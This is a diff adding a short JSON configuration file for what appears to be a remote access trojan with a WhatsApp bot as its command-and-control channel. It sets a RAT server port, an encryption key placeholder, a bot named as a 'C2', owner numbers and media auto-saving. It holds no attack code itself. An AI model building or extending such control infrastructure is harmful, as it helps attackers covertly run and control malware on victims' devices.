@@ -1,0 +1,18 @@
+{
+  "ratServer": {
+    "host": "127.0.0.1",
+    "port": 4444,
+    "encryptionKey": "YOUR_ENCRYPTION_KEY_HERE",
+    "apiPort": 5000
+  },
+  "whatsapp": {
+    "botName": "T0OL-B4S3-263 C2",
+    "prefix": "/",
+    "ownerNumbers": ["1234567890@s.whatsapp.net"]
+  },
+  "features": {
+    "autoSaveMedia": true,
+    "maxCommandTimeout": 60000,
+    "enableNotifications": true
+  }
+}
